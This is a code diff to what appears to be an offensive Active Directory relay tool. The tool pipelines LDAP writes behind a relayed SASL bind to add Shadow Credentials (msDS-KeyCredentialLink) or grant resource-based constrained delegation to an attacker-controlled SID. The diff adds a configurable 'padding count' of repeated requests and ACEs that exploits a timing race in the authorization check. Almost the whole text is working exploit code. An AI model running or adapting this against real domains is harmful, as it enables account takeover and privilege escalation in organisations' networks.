@@ -489,7 +489,7 @@ class RawLdapConnection:
         next_id = bind_id
         for operation_tag, body in requests:
             next_id += 1
-            ids.append((next_id, operation_tag + 1))
+            ids.append((next_id, 0x65 if operation_tag == 0x63 else operation_tag + 1))
             packet.extend(ber_tlv(
                 0x30,
                 ber_integer(next_id) + ber_tlv(operation_tag, body),
@@ -497,18 +497,44 @@ class RawLdapConnection:
         packet.extend(ldap_sasl_bind(bind_id, token))
         self.sock.sendall(packet)
 
+        expected_order = {
+            message_id: index for index, (message_id, _tag) in enumerate(ids)
+        }
         bind = None
-        operation_responses = []
-        for _index in range(len(ids) + 1):
+        terminal_operation_responses = []
+        completed_ids = set()
+        response_limit = len(ids) * 2 + 1
+        for _index in range(response_limit):
             response = self._response()
-            if ldap_message_id(response) == bind_id:
+            response_id = ldap_message_id(response)
+            if response_id == bind_id:
                 bind = parse_ldap_bind_response(response, bind_id)
+            elif response_id in expected_order:
+                operation_tag, _operation = ldap_message(response, response_id)
+                expected_tag = ids[expected_order[response_id]][1]
+                if operation_tag == expected_tag:
+                    if response_id in completed_ids:
+                        raise RelayError("queued LDAP operation returned twice")
+                    terminal_operation_responses.append(response)
+                    completed_ids.add(response_id)
+                elif not (expected_tag == 0x65 and operation_tag in (0x64, 0x73)):
+                    raise RelayError(
+                        f"queued LDAP operation returned unexpected tag "
+                        f"0x{operation_tag:02x}"
+                    )
             else:
-                operation_responses.append(response)
+                raise RelayError("queued LDAP exchange returned an unexpected message ID")
+            if bind is not None and len(completed_ids) == len(ids):
+                break
         if bind is None:
             raise RelayError("queued LDAP exchange returned no BindResponse")
+        if len(completed_ids) != len(ids):
+            raise RelayError("queued LDAP exchange did not finish every operation")
         self.message_id = next_id
-        self._prefetched_responses = operation_responses
+        terminal_operation_responses.sort(
+            key=lambda item: expected_order[ldap_message_id(item)]
+        )
+        self._prefetched_responses = terminal_operation_responses
         return bind, ids
 
 # ---------------------------------------------------------------------------
@@ -1012,15 +1038,59 @@ def domain_dn(domain: str) -> str:
 def ldap_modify_request(
     dn: str, attribute: str, operation: int, values: list[bytes],
 ) -> tuple[int, bytes]:
-    partial_attribute = (
-        ber_tlv(0x04, attribute.encode("ascii"))
-        + ber_tlv(0x31, b"".join(ber_tlv(0x04, value) for value in values))
+    return ldap_modify_changes_request(dn, [(attribute, operation, values)])
+
+
+def ldap_modify_changes_request(
+    dn: str, changes: list[tuple[str, int, list[bytes]]],
+) -> tuple[int, bytes]:
+    encoded_changes = bytearray()
+    for attribute, operation, values in changes:
+        partial_attribute = (
+            ber_tlv(0x04, attribute.encode("ascii"))
+            + ber_tlv(0x31, b"".join(ber_tlv(0x04, value) for value in values))
+        )
+        encoded_changes.extend(
+            ber_tlv(
+                0x30,
+                ber_tlv(0x0A, bytes([operation]))
+                + ber_tlv(0x30, partial_attribute),
+            )
+        )
+    return 0x66, ber_tlv(0x04, dn.encode("utf-8")) + ber_tlv(
+        0x30, bytes(encoded_changes)
     )
-    change = ber_tlv(
-        0x30,
-        ber_tlv(0x0A, bytes([operation])) + ber_tlv(0x30, partial_attribute),
-    )
-    return 0x66, ber_tlv(0x04, dn.encode("utf-8")) + ber_tlv(0x30, change)
+
+
+def rbcd_descriptor(trustee_sid: str, ace_count: int) -> bytes:
+    """Build an RBCD descriptor whose repeated ACEs provide conversion work."""
+    from impacket.ldap import ldaptypes
+
+    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
+    descriptor["Revision"] = b"\x01"
+    descriptor["Sbz1"] = b"\x00"
+    descriptor["Control"] = 0x8004
+    owner = ldaptypes.LDAP_SID()
+    owner.fromCanonical("S-1-5-32-544")
+    descriptor["OwnerSid"] = owner
+    descriptor["GroupSid"] = b""
+    descriptor["Sacl"] = b""
+    dacl = ldaptypes.ACL()
+    dacl["AclRevision"] = 4
+    dacl["Sbz1"] = 0
+    dacl["Sbz2"] = 0
+    ace = ldaptypes.ACE()
+    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
+    ace["AceFlags"] = 0
+    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
+    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
+    ace["Ace"]["Mask"]["Mask"] = 0x1F01FF
+    trustee = ldaptypes.LDAP_SID()
+    trustee.fromCanonical(trustee_sid)
+    ace["Ace"]["Sid"] = trustee
+    dacl.aces = [ace] * ace_count
+    descriptor["Dacl"] = dacl
+    return descriptor.getData()
 
 
 def prepare_shadow_credential(
@@ -1056,8 +1126,9 @@ def prepare_shadow_credential(
         key_id.hex(),
         str(device_id),
     )
+    request = ldap_modify_request(dn, "msDS-KeyCredentialLink", 0, [value])
     return (
-        [ldap_modify_request(dn, "msDS-KeyCredentialLink", 0, [value])],
+        [request] * options.padding_count,
         bundle,
         target,
     )
@@ -1071,46 +1142,17 @@ def prepare_rbcd_pipeline(
         raise RelayError("--target-dn is required for direct RBCD")
     if not options.delegate_sid:
         raise RelayError("--delegate-sid is required for direct RBCD")
-    from impacket.ldap import ldaptypes
-
     # RBCD is an NT security descriptor. Grant only the operator-supplied
     # principal, rather than installing a permissive NULL DACL.
-    descriptor = ldaptypes.SR_SECURITY_DESCRIPTOR()
-    descriptor["Revision"] = b"\x01"
-    descriptor["Sbz1"] = b"\x00"
-    descriptor["Control"] = 0x8004
-    owner = ldaptypes.LDAP_SID()
-    owner.fromCanonical("S-1-5-32-544")
-    descriptor["OwnerSid"] = owner
-    descriptor["GroupSid"] = b""
-    descriptor["Sacl"] = b""
-
-    dacl = ldaptypes.ACL()
-    dacl["AclRevision"] = 4
-    dacl["Sbz1"] = 0
-    dacl["Sbz2"] = 0
-    ace = ldaptypes.ACE()
-    ace["AceType"] = ldaptypes.ACCESS_ALLOWED_ACE.ACE_TYPE
-    ace["AceFlags"] = 0
-    ace["Ace"] = ldaptypes.ACCESS_ALLOWED_ACE()
-    # This is the generic all-rights mask used by standard RBCD tooling.
-    ace["Ace"]["Mask"] = ldaptypes.ACCESS_MASK()
-    ace["Ace"]["Mask"]["Mask"] = 0x1F01FF
-    trustee = ldaptypes.LDAP_SID()
-    trustee.fromCanonical(options.delegate_sid)
-    ace["Ace"]["Sid"] = trustee
     # AD dispatches pipelined requests on separate workers. Repeating the same
     # trustee ACE gives the final SASL bind time to commit before this write's
     # authorization check without granting any additional principal. Shorter
     # descriptors intermittently reach that check while the bind is pending.
-    dacl.aces = [ace] * 8
-    descriptor["Dacl"] = dacl
-
     request = ldap_modify_request(
         options.ldap_target_dn,
         "msDS-AllowedToActOnBehalfOfOtherIdentity",
         2,
-        [descriptor.getData()],
+        [rbcd_descriptor(options.delegate_sid, options.padding_count)],
     )
     target = f"{options.machine.rstrip('$')}$"
     delegate = options.delegate_account or "controlled principal"
@@ -1146,6 +1188,26 @@ def collect_pipelined_attack(
                     identity = value.decode("utf-8", errors="replace")
             log(f"Pipelined LDAP identity: {identity or '<empty>'}")
     return identity
+
+
+def collect_shadow_candidates(
+    ldap: RawLdapConnection, ids: list[tuple[int, int]], log: Callable[[str], None],
+) -> None:
+    """Require one of the identical KeyCredentialLink candidates to commit."""
+    kcl_success = False
+    for message_id, expected_tag in ids:
+        operation_tag, operation = ldap_message(ldap._response(), message_id)
+        if operation_tag != expected_tag:
+            raise RelayError(
+                f"queued ShadowCred response had tag 0x{operation_tag:02x}"
+            )
+        result_code, diagnostic = ldap_result(operation)
+        if result_code == 0:
+            kcl_success = True
+        else:
+            log(f"ShadowCred candidate result={result_code}: {diagnostic}")
+    if not kcl_success:
+        raise RelayError("queued ShadowCred exchange returned no successful KCL write")
 
 
 def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
@@ -1205,12 +1267,13 @@ def run_ldap_session(channel: RecordChannel, options: argparse.Namespace):
                 raise RelayError(f"LDAP SASL bind failed with result {response.result_code}{detail}")
             log("LDAP final bind succeeded; validating the queued directory write")
             if pipelined_ids:
-                collect_pipelined_attack(ldap, pipelined_ids, log)
                 if pipeline_bundle:
+                    collect_shadow_candidates(ldap, pipelined_ids, log)
                     print(f"[+] Added Shadow Credential to {pipeline_target}", flush=True)
                     channel.send(MSG_AUTH_OK)
                     channel.bof_released = True
                     return pipeline_bundle
+                collect_pipelined_attack(ldap, pipelined_ids, log)
                 print(
                     f"[+] RBCD delegate added: {pipeline_rbcd.delegate} "
                     f"({pipeline_rbcd.sid}) -> {pipeline_rbcd.target}",
@@ -1350,12 +1413,20 @@ def parse_args(argv: list[str]) -> argparse.Namespace:
     shadowcred.set_defaults(mode="shadowcred")
     shadowcred.add_argument("--pfx-out", metavar="PATH")
     shadowcred.add_argument("--export-pfx-b64", action="store_true")
+    shadowcred.add_argument(
+        "--padding-count", type=int, default=8,
+        help="number of identical KCL candidates used as a timing pad (default: 8)",
+    )
 
     rbcd = actions.add_parser("rbcd", help="grant resource-based constrained delegation")
     add_ldap(rbcd)
     rbcd.set_defaults(mode="rbcd")
     rbcd.add_argument("--delegate-account", help="controlled SPN account label")
     rbcd.add_argument("--delegate-sid", required=True, help="controlled SPN account SID")
+    rbcd.add_argument(
+        "--padding-count", type=int, default=8,
+        help="number of identical trustee ACEs used as an LDAP timing pad (default: 8)",
+    )
     return parser.parse_args(argv)
 
 def pfx_output_path(bundle: CertificateBundle, options: argparse.Namespace) -> Optional[str]:
@@ -1414,6 +1485,10 @@ def main(argv: list[str]) -> int:
     else:
         if options.mode == "shadowcred" and not (options.pfx_out or options.export_pfx_b64):
             raise SystemExit("shadowcred mode requires --pfx-out or --export-pfx-b64")
+        if options.mode == "shadowcred" and not 1 <= options.padding_count <= 4096:
+            raise SystemExit("--padding-count must be between 1 and 4096")
+        if options.mode == "rbcd" and not 1 <= options.padding_count <= 4096:
+            raise SystemExit("--padding-count must be between 1 and 4096")
         ports = [options.port, options.ldap_port]
     if any(not 1 <= value <= 65535 for value in ports):
         raise SystemExit("TCP ports must be between 1 and 65535")
